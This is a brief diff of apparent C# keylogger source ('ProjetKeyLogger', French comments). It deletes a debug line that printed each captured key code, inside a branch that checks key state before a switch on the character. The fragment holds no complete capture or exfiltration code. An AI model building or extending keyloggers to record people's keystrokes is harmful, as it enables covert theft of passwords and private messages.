@@ -91,7 +91,6 @@ namespace ProjetKeyLogger
                     // on caste le nombre ascii en char
                     if (statut_cle == 32769 && autorise_saisie == true)
                     {
-                        Console.WriteLine(codeASCII);
                         switch (codeASCII)
                         {
                             
